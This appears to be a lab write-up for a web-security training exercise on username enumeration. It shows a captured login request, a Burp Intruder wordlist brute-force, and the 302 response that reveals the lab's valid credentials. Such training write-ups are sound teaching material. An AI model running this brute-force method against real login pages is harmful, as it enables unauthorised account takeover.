## Username enumeration via different responses

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

Candidate usernames
Candidate passwords

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

## Notes

- Possibility to leave a comment on a post
- /login

## Resume

1. Capture a login request
2. Send request to intruder on **sniper attack**
3. Bruteforce with the two wordlist

## Solve 

To start, we have to capture a **login** request and send it to intruder. 

```
POST /login HTTP/2
Host: 0a2200a20418a2d581758ef90091005a.web-security-academy.net
Cookie: session=WD7VWgjI9n5hwre1qRqve87MEjWanxqI
Content-Length: 27
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0a2200a20418a2d581758ef90091005a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2200a20418a2d581758ef90091005a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=tata&password=tata
```

Set first payload with the username wordlist and the second one on password with passwords wordlist. Run the attack and wait for it to be done. Filter with **Status code**. We can see only one request with a **302** status code, meaning that we're getting redirect to the profil page : 


```
POST /login HTTP/2
Host: 0a2200a20418a2d581758ef90091005a.web-security-academy.net
Cookie: session=WD7VWgjI9n5hwre1qRqve87MEjWanxqI
Content-Length: 27
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0a2200a20418a2d581758ef90091005a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2200a20418a2d581758ef90091005a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=akamai&password=qazwsx
```

The answer : 

```
HTTP/2 302 Found
Location: /my-account?id=akamai
Set-Cookie: session=EQmoD0zYzaBRPp5v3vmD6hA1LPPJm7DJ; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```